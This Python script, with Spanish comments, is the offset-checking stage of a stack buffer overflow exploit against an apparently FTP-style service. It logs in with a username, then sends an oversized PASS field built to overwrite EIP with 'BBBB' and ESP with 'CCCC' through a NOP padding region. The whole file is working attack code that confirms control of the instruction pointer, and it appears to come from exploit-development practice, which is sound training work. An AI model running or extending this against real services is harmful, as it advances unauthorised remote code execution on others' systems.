#!/usr/bin/python3
import socket, sys
from parameters import rhost, rport, timeout, offsetEIP, offsetESP, buffer
from colors import colors

try:
    # conexión
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((rhost, rport))
    s.recv(1024)

    print(colors.Green + '\nCheck de offset...' + colors.End)

    # usuario
    s.send(b'USER MrW0l05zyn\r\n')
    s.recv(1024)

    buf = b''
    buf += b'A'*(offsetEIP - len(buf))          # offset EIP
    buf += b'BBBB'                           	# sobrescribir EIP
    buf += b'\x90'*(offsetESP - offsetEIP - 4)  # padding entre EIP and ESP
    buf += b'CCCC'                           	# sobrescribir ESP
    buf += b'D'*(buffer - len(buf))      	    # relleno de padding

    # check offset
    s.send(b'PASS ' + buf + b'\r\n')
    s.recv(1024)

except Exception as error:
    print(colors.Red + '\n[!] Ha ocurrido un error:', str(error) + colors.End)
    sys.exit(0)
    
finally:
    # cierre de conexión
    s.close()